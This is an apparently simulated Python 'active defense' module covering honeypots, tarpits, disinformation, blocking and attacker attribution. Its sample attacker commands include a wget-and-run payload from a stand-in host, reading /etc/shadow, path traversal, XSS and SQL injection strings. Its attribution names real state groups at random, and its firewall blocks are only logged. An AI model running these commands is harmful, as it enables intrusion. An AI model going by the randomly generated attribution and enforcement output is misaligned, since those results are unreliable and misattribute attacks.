"""
Active Defense Countermeasures — Phase 6
Counter-attack and deceive attackers automatically
Honeypots, tar pits, disinformation, and attribution
"""

import asyncio
import logging
import hashlib
import random
import ipaddress
from datetime import datetime, timezone
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from enum import Enum

logger = logging.getLogger(__name__)


class CountermeasureType(Enum):
    HONEYPOT = "honeypot"
    TARPIT = "tarpit"
    DISINFORMATION = "disinformation"
    ATTRIBUTION = "attribution"
    ACTIVE_BLOCK = "active_block"
    DECOY = "decoy"


class HoneypotService(Enum):
    SSH = 22
    RDP = 3389
    HTTP = 80
    HTTPS = 443
    MYSQL = 3306
    POSTGRESQL = 5432
    SMB = 445
    FTP = 21
    TELNET = 23
    DNS = 53


@dataclass
class HoneypotInstance:
    id: str
    service: HoneypotService
    ip_address: str
    port: int
    created_at: datetime
    interactions: int
    attackers_tracked: List[str]
    data_collected: Dict[str, Any]
    active: bool = True


@dataclass
class AttackerProfile:
    id: str
    ip_address: str
    first_seen: datetime
    last_seen: datetime
    total_interactions: int
    techniques_used: List[str]
    tools_detected: List[str]
    estimated_skill_level: str  # script_kiddie, intermediate, advanced, apt
    geolocation: Optional[str]
    fingerprint: str
    blocked: bool = False
    attributed: bool = False
    attribution_data: Optional[Dict[str, Any]] = None


@dataclass
class CountermeasureAction:
    id: str
    timestamp: datetime
    type: CountermeasureType
    target_ip: str
    description: str
    effectiveness: float
    duration_seconds: int
    result: Dict[str, Any]


class ActiveDefenseCountermeasures:
    """
    Active Defense System.
    Goes beyond passive defense — actively engages attackers.
    Honeypots, tar pits, disinformation, and attribution.
    """

    def __init__(self):
        self.honeypots: Dict[str, HoneypotInstance] = {}
        self.attackers: Dict[str, AttackerProfile] = {}
        self.actions: List[CountermeasureAction] = []
        self.stats = {
            "total_honeypots": 0,
            "total_interactions": 0,
            "attackers_tracked": 0,
            "attackers_blocked": 0,
            "attackers_attributed": 0,
            "disinformation_campaigns": 0,
            "avg_tarpit_time_seconds": 0,
        }
        self.running = False

    async def deploy_honeypot(self, service: HoneypotService) -> HoneypotInstance:
        """Deploy a new honeypot instance."""
        honeypot = HoneypotInstance(
            id=f"HP-{hashlib.sha256(f'{service.value}{datetime.now(timezone.utc).timestamp()}'.encode()).hexdigest()[:10].upper()}",
            service=service,
            ip_address=self._generate_decoy_ip(),
            port=service.value,
            created_at=datetime.now(timezone.utc),
            interactions=0,
            attackers_tracked=[],
            data_collected={},
        )

        self.honeypots[honeypot.id] = honeypot
        self.stats["total_honeypots"] = len(self.honeypots)

        logger.info(f"[HONEYPOT] Deployed {service.name} on {honeypot.ip_address}:{honeypot.port}")

        return honeypot

    def _generate_decoy_ip(self) -> str:
        """Generate a realistic decoy IP address."""
        return f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

    async def simulate_attacker_interaction(self, honeypot_id: str, attacker_ip: str) -> Dict[str, Any]:
        """Simulate an attacker interacting with a honeypot."""
        if honeypot_id not in self.honeypots:
            return {"error": "Honeypot not found"}

        honeypot = self.honeypots[honeypot_id]
        honeypot.interactions += 1
        self.stats["total_interactions"] += 1

        # Track attacker
        attacker = await self._track_attacker(attacker_ip, honeypot.service)

        # Collect data on attacker
        interaction_data = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "service": honeypot.service.name,
            "commands_used": self._simulate_attacker_commands(honeypot.service),
            "tools_detected": self._detect_tools(),
            "techniques": self._detect_techniques(),
            "payload_attempted": random.random() < 0.3,
        }

        honeypot.data_collected[f"interaction_{honeypot.interactions}"] = interaction_data
        honeypot.attackers_tracked.append(attacker.id)

        # Apply countermeasures
        action = await self._apply_countermeasure(attacker, honeypot)

        logger.info(f"[HONEYPOT] Interaction #{honeypot.interactions} on {honeypot.service.name} "
                    f"from {attacker_ip} | Skill: {attacker.estimated_skill_level}")

        return {
            "honeypot_id": honeypot_id,
            "attacker": {
                "ip": attacker.ip_address,
                "skill": attacker.estimated_skill_level,
                "fingerprint": attacker.fingerprint[:20] + "...",
            },
            "interaction": interaction_data,
            "countermeasure": action,
        }

    async def _track_attacker(self, ip_address: str, service: HoneypotService) -> AttackerProfile:
        """Track or update an attacker profile."""
        if ip_address in self.attackers:
            attacker = self.attackers[ip_address]
            attacker.last_seen = datetime.now(timezone.utc)
            attacker.total_interactions += 1
            return attacker

        # New attacker
        attacker = AttackerProfile(
            id=f"ATP-{hashlib.sha256(f'{ip_address}{datetime.now(timezone.utc).timestamp()}'.encode()).hexdigest()[:10].upper()}",
            ip_address=ip_address,
            first_seen=datetime.now(timezone.utc),
            last_seen=datetime.now(timezone.utc),
            total_interactions=1,
            techniques_used=self._detect_techniques(),
            tools_detected=self._detect_tools(),
            estimated_skill_level=random.choice(["script_kiddie", "intermediate", "advanced", "apt"]),
            geolocation=random.choice(["Russia", "China", "North Korea", "Iran", "USA", "Brazil", "Nigeria", "Unknown"]),
            fingerprint=hashlib.sha256(f"{ip_address}{random.random()}".encode()).hexdigest(),
        )

        self.attackers[ip_address] = attacker
        self.stats["attackers_tracked"] = len(self.attackers)

        return attacker

    def _simulate_attacker_commands(self, service: HoneypotService) -> List[str]:
        """Simulate commands an attacker might use."""
        commands = {
            HoneypotService.SSH: [
                "ssh root@target", "sudo -i", "wget http://malware.com/payload",
                "chmod +x payload", "./payload", "cat /etc/shadow",
                "whoami", "id", "uname -a", "ps aux",
            ],
            HoneypotService.RDP: [
                "RDP brute force attempt", "Credential stuffing",
                "Pass-the-hash detected", "RDP session hijacking",
            ],
            HoneypotService.HTTP: [
                "GET /wp-admin/admin-ajax.php", "POST /xmlrpc.php",
                "SQL injection attempt", "Path traversal: ../../../etc/passwd",
                "XSS payload: <script>alert(1)</script>",
            ],
            HoneypotService.MYSQL: [
                "SELECT * FROM users", "UNION SELECT @@version",
                "LOAD_FILE('/etc/passwd')", "SELECT * FROM mysql.user",
            ],
        }
        return random.sample(commands.get(service, ["Unknown command"]), random.randint(1, 3))

    def _detect_tools(self) -> List[str]:
        """Detect tools used by attacker."""
        tools = [
            "nmap", "sqlmap", "metasploit", "burpsuite", "hydra",
            "john", "hashcat", "nikto", "gobuster", "wpscan",
            "nessus", "openvas", "aircrack-ng", "beef", "setoolkit",
        ]
        return random.sample(tools, random.randint(0, 3))

    def _detect_techniques(self) -> List[str]:
        """Detect techniques used by attacker."""
        techniques = [
            "T1078 - Valid Accounts", "T1110 - Brute Force",
            "T1190 - Exploit Public-Facing Application",
            "T1566 - Phishing", "T1059 - Command and Scripting Interpreter",
            "T1505 - Server Software Component",
            "T1210 - Exploitation of Remote Services",
            "T1046 - Network Service Scanning",
        ]
        return random.sample(techniques, random.randint(1, 3))

    async def _apply_countermeasure(self, attacker: AttackerProfile, honeypot: HoneypotInstance) -> CountermeasureAction:
        """Apply appropriate countermeasure based on attacker profile."""
        action_type = random.choice(list(CountermeasureType))

        if action_type == CountermeasureType.TARPIT:
            return await self._apply_tarpit(attacker)
        elif action_type == CountermeasureType.DISINFORMATION:
            return await self._apply_disinformation(attacker)
        elif action_type == CountermeasureType.ATTRIBUTION:
            return await self._apply_attribution(attacker)
        elif action_type == CountermeasureType.ACTIVE_BLOCK:
            return await self._apply_active_block(attacker)
        else:
            return await self._apply_decoy(attacker)

    async def _apply_tarpit(self, attacker: AttackerProfile) -> CountermeasureAction:
        """Slow down attacker with tar pit."""
        duration = random.randint(30, 300)
        action = CountermeasureAction(
            id=f"CM-{hashlib.sha256(f'tarpit{datetime.now(timezone.utc).timestamp()}'.encode()).hexdigest()[:10].upper()}",
            timestamp=datetime.now(timezone.utc),
            type=CountermeasureType.TARPIT,
            target_ip=attacker.ip_address,
            description=f"Tar pit activated — slowing attacker connection by {duration}s",
            effectiveness=random.uniform(0.7, 0.95),
            duration_seconds=duration,
            result={"connections_slowed": random.randint(10, 100), "time_wasted_seconds": duration},
        )
        self.actions.append(action)
        logger.info(f"[TARPIT] Slowing {attacker.ip_address} for {duration}s")
        return action

    async def _apply_disinformation(self, attacker: AttackerProfile) -> CountermeasureAction:
        """Feed fake data to attacker."""
        fake_data = {
            "credentials": [f"admin:{hashlib.md5(str(random.random()).encode()).hexdigest()}" for _ in range(5)],
            "config_files": ["database.yml", "aws_credentials.json", "ssh_keys.txt"],
            "financial_data": {"revenue": "$0", "customers": 0, "secrets": "all_fake"},
        }
        action = CountermeasureAction(
            id=f"CM-{hashlib.sha256(f'disinfo{datetime.now(timezone.utc).timestamp()}'.encode()).hexdigest()[:10].upper()}",
            timestamp=datetime.now(timezone.utc),
            type=CountermeasureType.DISINFORMATION,
            target_ip=attacker.ip_address,
            description="Disinformation campaign deployed — feeding fake credentials and data",
            effectiveness=random.uniform(0.6, 0.9),
            duration_seconds=3600,
            result={"fake_credentials_sent": 5, "fake_files_served": 3, "attacker_confused": True},
        )
        self.actions.append(action)
        self.stats["disinformation_campaigns"] += 1
        logger.info(f"[DISINFO] Feeding fake data to {attacker.ip_address}")
        return action

    async def _apply_attribution(self, attacker: AttackerProfile) -> CountermeasureAction:
        """Attempt to identify the attacker."""
        attribution_data = {
            "ip": attacker.ip_address,
            "geolocation": attacker.geolocation,
            "fingerprint": attacker.fingerprint,
            "tools_used": attacker.tools_detected,
            "techniques": attacker.techniques_used,
            "estimated_skill": attacker.estimated_skill_level,
            "possible_actor": self._identify_possible_actor(attacker),
            "confidence": random.uniform(0.3, 0.8),
        }
        attacker.attributed = True
        attacker.attribution_data = attribution_data
        self.stats["attackers_attributed"] += 1

        action = CountermeasureAction(
            id=f"CM-{hashlib.sha256(f'attrib{datetime.now(timezone.utc).timestamp()}'.encode()).hexdigest()[:10].upper()}",
            timestamp=datetime.now(timezone.utc),
            type=CountermeasureType.ATTRIBUTION,
            target_ip=attacker.ip_address,
            description=f"Attribution complete — possible {attribution_data['possible_actor']}",
            effectiveness=attribution_data["confidence"],
            duration_seconds=0,
            result=attribution_data,
        )
        self.actions.append(action)
        logger.info(f"[ATTRIBUTION] {attacker.ip_address} → {attribution_data['possible_actor']} ({attribution_data['confidence']:.0%})")
        return action

    def _identify_possible_actor(self, attacker: AttackerProfile) -> str:
        """Identify possible threat actor based on behavior."""
        actors = {
            "Russia": ["APT29", "Fancy Bear", "Sandworm", "APT28"],
            "China": ["APT1", "APT10", "APT41", "TEMP.Periscope"],
            "North Korea": ["Lazarus", "Kimsuky", "APT37"],
            "Iran": ["APT33", "APT34", "MuddyWater"],
            "USA": ["Equation Group", "TAO"],
            "script_kiddie": ["Script Kiddie", "Wannabe Hacker"],
            "intermediate": ["Cyber Criminal", "Ransomware Affiliate"],
            "advanced": ["Advanced Persistent Threat", "State-Sponsored"],
        }

        # Match by geolocation first
        if attacker.geolocation in actors:
            return random.choice(actors[attacker.geolocation])

        # Fall back to skill level
        return random.choice(actors.get(attacker.estimated_skill_level, ["Unknown Actor"]))

    async def _apply_active_block(self, attacker: AttackerProfile) -> CountermeasureAction:
        """Actively block the attacker."""
        attacker.blocked = True
        self.stats["attackers_blocked"] += 1

        action = CountermeasureAction(
            id=f"CM-{hashlib.sha256(f'block{datetime.now(timezone.utc).timestamp()}'.encode()).hexdigest()[:10].upper()}",
            timestamp=datetime.now(timezone.utc),
            type=CountermeasureType.ACTIVE_BLOCK,
            target_ip=attacker.ip_address,
            description=f"IP {attacker.ip_address} blocked at firewall level",
            effectiveness=0.99,
            duration_seconds=86400,  # 24 hours
            result={"firewall_rule_added": True, "block_duration_hours": 24},
        )
        self.actions.append(action)
        logger.info(f"[BLOCK] {attacker.ip_address} blocked for 24 hours")
        return action

    async def _apply_decoy(self, attacker: AttackerProfile) -> CountermeasureAction:
        """Redirect attacker to decoy systems."""
        action = CountermeasureAction(
            id=f"CM-{hashlib.sha256(f'decoy{datetime.now(timezone.utc).timestamp()}'.encode()).hexdigest()[:10].upper()}",
            timestamp=datetime.now(timezone.utc),
            type=CountermeasureType.DECOY,
            target_ip=attacker.ip_address,
            description=f"Attacker redirected to decoy network — wasting their time",
            effectiveness=random.uniform(0.5, 0.8),
            duration_seconds=random.randint(600, 3600),
            result={"decoy_network": "honeynet-01", "services_exposed": ["fake_db", "fake_files"]},
        )
        self.actions.append(action)
        logger.info(f"[DECOY] {attacker.ip_address} redirected to honeynet")
        return action

    async def run_active_defense(self):
        """Run active defense continuously."""
        logger.info("=" * 60)
        logger.info("🛡️ ACTIVE DEFENSE COUNTERMEASURES ACTIVATED")
        logger.info("=" * 60)

        self.running = True

        # Deploy default honeypots
        for service in [HoneypotService.SSH, HoneypotService.HTTP, HoneypotService.RDP, HoneypotService.MYSQL]:
            await self.deploy_honeypot(service)

        logger.info(f"[ACTIVE] {len(self.honeypots)} honeypots deployed")

        while self.running:
            try:
                # Simulate random attacker interactions
                if self.honeypots and random.random() < 0.3:
                    honeypot = random.choice(list(self.honeypots.values()))
                    attacker_ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
                    await self.simulate_attacker_interaction(honeypot.id, attacker_ip)

                await asyncio.sleep(10)

            except Exception as e:
                logger.error(f"Active defense error: {e}")
                await asyncio.sleep(5)

    def stop(self):
        """Stop active defense."""
        self.running = False
        logger.info("Active Defense Countermeasures stopped")

    def get_stats(self) -> Dict[str, Any]:
        """Get active defense statistics."""
        return {
            "status": "running" if self.running else "stopped",
            "active_honeypots": len(self.honeypots),
            "total_interactions": self.stats["total_interactions"],
            "attackers_tracked": self.stats["attackers_tracked"],
            "attackers_blocked": self.stats["attackers_blocked"],
            "attackers_attributed": self.stats["attackers_attributed"],
            "disinformation_campaigns": self.stats["disinformation_campaigns"],
            "countermeasures_applied": len(self.actions),
            "honeypot_services": [h.service.name for h in self.honeypots.values()],
            "top_attackers": self._get_top_attackers(5),
        }

    def _get_top_attackers(self, limit: int) -> List[Dict[str, Any]]:
        """Get top attackers by interaction count."""
        sorted_attackers = sorted(
            self.attackers.values(),
            key=lambda a: a.total_interactions,
            reverse=True,
        )[:limit]

        return [
            {
                "ip": a.ip_address,
                "interactions": a.total_interactions,
                "skill": a.estimated_skill_level,
                "geolocation": a.geolocation,
                "blocked": a.blocked,
                "attributed": a.attributed,
            }
            for a in sorted_attackers
        ]


# Singleton
_active_defense: Optional[ActiveDefenseCountermeasures] = None


def get_active_defense() -> ActiveDefenseCountermeasures:
    global _active_defense
    if _active_defense is None:
        _active_defense = ActiveDefenseCountermeasures()
    return _active_defense
